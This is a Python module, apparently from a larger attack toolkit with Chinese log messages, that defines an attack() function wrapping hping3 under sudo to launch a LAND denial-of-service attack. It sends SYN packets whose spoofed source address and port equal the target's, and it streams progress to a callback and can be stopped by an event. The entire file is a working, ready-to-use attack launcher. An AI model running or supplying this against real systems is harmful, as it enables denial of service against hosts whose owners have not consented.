import subprocess
import time
import threading

def attack(target_ip, target_port, callback, packet_count=1, stop_event=None):
    callback(f"[hping3] 發動 LAND 攻擊：來源與目標皆為 {target_ip}:{target_port}")

    cmd = [
        "sudo", "hping3", target_ip,
        "-S",  # SYN
        "-a", target_ip,
        "-s", str(target_port),
        "-p", str(target_port),
        "-c", str(packet_count)
    ]

    callback(f"[hping3] 執行指令：{' '.join(cmd)}")

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        def monitor_stop():
            while not (stop_event and stop_event.is_set()):
                if proc.poll() is not None:
                    break
                time.sleep(0.1)
            if stop_event and stop_event.is_set():
                callback("[hping3] 收到停止請求，正在終止攻擊...")
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    callback("[hping3] 攻擊未正常終止，強制終止...")
                    proc.kill()
                    proc.wait()

        threading.Thread(target=monitor_stop, daemon=True).start()

        for line in proc.stdout:
            callback(f"[hping3] {line.strip()}")
            if stop_event and stop_event.is_set():
                break

        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

        callback(f"[hping3] 攻擊結束，返回碼：{proc.returncode}")
        return proc.returncode == 0

    except Exception as e:
        callback(f"[hping3] 錯誤：{e}")
        return False
